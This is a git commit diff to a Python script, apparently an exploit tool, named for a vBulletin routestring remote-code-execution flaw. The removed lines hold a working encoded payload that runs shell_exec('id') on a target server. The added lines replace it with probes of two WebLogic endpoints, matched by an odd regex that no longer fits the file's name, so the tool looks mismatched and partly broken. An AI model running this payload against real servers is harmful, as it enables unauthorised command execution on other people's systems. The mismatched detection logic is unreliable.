c830e92ff0bc02fb2161968a48a89553d0c7f012
ludy-dev <70466565+ludy-dev@users.noreply.github.com>
2020-11-08 05:15:26 +0900

    Update vBulletin_Routestring-RCE.py

--- vBulletin_Routestring-RCE.py
+++ vBulletin_Routestring-RCE.py
@@ -4,25 +4,29 @@ import sys
 import os
 
 def exploit(dst_addr):
-       URL="http://"+dst_addr
-       data ={"routestring" : "ajax%2frender%2fwidget_php%26widgetConfig%5bcode%5d%3d%7b'widgetConfig%5bcode%5d'%3a+%22echo+shell_exec('id')exit%3b%22%7d"}
-       res = requests.post(URL, data=data, verify=False)
-       response = res.text
+        vuln_list =("/_async/AsyncResponseService", "/wls-wsat/CoordinatorPortType")
+        URL="http://"+dst_addr
 
-       p = re.compile('uid=\d')
-       m = p.match(response)
-       print("Status Code : %d"% res.status_code)
-       if m:
-               print("Vuln Found")
-       else:
-               print("Not Found")
+        for i in vuln_list:
+                print(URL+i)
+                res = requests.get(URL+i, verify=False)
+                response = res.text
+                print("Status Code : %d"% res.status_code)
+
+                p = re.compile('elcome|eb')
+                m = p.match(response)
+                if m:
+                        print("Vuln Found")
+                else:
+                        print("Not Found")
 
 if __name__ == "__main__":
-       if len(sys.argv) == 2:
-              sys.argv.append('80')
-       elif len(sys.argv) < 3:
-               print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
-               sys.exit()
-       address =(sys.argv[1], sys.argv[2])
-       dst_addr=":".join(address)
-       exploit(dst_addr)
+	if len(sys.argv) == 2:
+		   sys.argv.append('80')
+	elif len(sys.argv) < 3:
+			print('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
+			sys.exit()
+	
+	address =(sys.argv[1], sys.argv[2])
+	dst_addr=":".join(address)
+	exploit(dst_addr)
